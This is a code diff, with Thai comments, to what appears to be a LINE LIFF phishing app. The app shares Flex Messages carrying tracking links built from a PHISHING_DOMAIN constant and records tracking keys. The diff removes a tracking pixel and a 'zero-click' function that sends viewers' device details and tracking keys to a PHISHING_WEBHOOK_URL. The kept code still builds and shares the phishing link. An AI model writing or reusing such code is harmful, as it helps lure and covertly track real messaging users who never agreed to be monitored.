@@ -819,8 +819,6 @@
                 
                 // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
-                // สร้าง URL สำหรับ Tracking Pixel (เมื่อแสดงผล Preview)
-                const pixelTrackUrl = `${PHISHING_WEBHOOK_URL}?action=pixelTrack&key=${encodeURIComponent(trackingKey)}&t=${Date.now()}`; // Add timestamp to try bypassing cache
 
                 // สร้างข้อความแชร์ (Flex Message)
                 const message = {
@@ -843,12 +841,10 @@
                     }
                 };
 
-                console.log("Attempting to share Flex Message (no pixel):", JSON.stringify(message, null, 2)); // Updated log message
-
-                // Removed: sendZeroClickNotification call was here previously
+                console.log("Attempting to share Flex Message:", JSON.stringify(message, null, 2)); // Simplified log message
 
                 if (liff.isApiAvailable('shareTargetPicker')) {
-                    console.log("ShareTargetPicker is available. Calling now..."); // Added log
+                    console.log("ShareTargetPicker is available. Calling now...");
                     const result = await liff.shareTargetPicker([message]);
                     console.log("ShareTargetPicker result:", result); // Added log
 
@@ -871,10 +867,7 @@
                             showStatus('เกิดข้อผิดพลาดในการบันทึก Tracking Key: ' + saveError.message, false);
                         }
 
-                        // 2. Removed: sendZeroClickNotification(trackingKey, caseName);
-                        // การแจ้งเตือน Zero Click จะถูกจัดการโดย zero-click.html และ GoogleScript.html เมื่อผู้รับเปิดลิงก์
-
-                        // 3. รีเซ็ตหน้าจอ
+                        // รีเซ็ตหน้าจอ
                         resetForm();
                     } else {
                         showStatus('การแชร์ถูกยกเลิก', false);
@@ -886,42 +879,6 @@
             } catch (error) {
                 console.error('Error in shareImage function:', error); // Enhanced log
                 showStatus('เกิดข้อผิดพลาดในการแชร์รูปภาพ: ' + (error.message || error), false); // Show error message or error object
-            }
-        }
-        
-        // ฟังก์ชันส่งการแจ้งเตือน Zero Click (ส่งไปที่ GoogleScript.html)
-        async function sendZeroClickNotification(trackingKey, caseName) {
-            try {
-                // ข้อมูลอุปกรณ์และข้อมูลพื้นฐานเพื่อส่งไปยังเซิร์ฟเวอร์
-                const dataToSend = {
-                    trackingKey: trackingKey,
-                    caseName: caseName,
-                    message: "[Zero Click] มีผู้เปิดดูข้อความ",
-                    timestamp: new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' }),
-                    ip: { ip: "กำลังตรวจสอบ" },
-                    deviceInfo: {
-                        userAgent: navigator.userAgent,
-                        platform: navigator.platform,
-                        language: navigator.language
-                    },
-                    requestId: generateUniqueId(),
-                    type: "zero-click-first-view"
-                };
-                
-                // ส่งข้อมูลไปยัง Webhook (GoogleScript.html)
-                await fetch(PHISHING_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(dataToSend),
-                    mode: 'no-cors'
-                });
-                
-                console.log('ส่งการแจ้งเตือน Zero Click สำเร็จ');
-                
-            } catch (error) {
-                console.error('Error sending Zero Click notification', error);
             }
         }
         
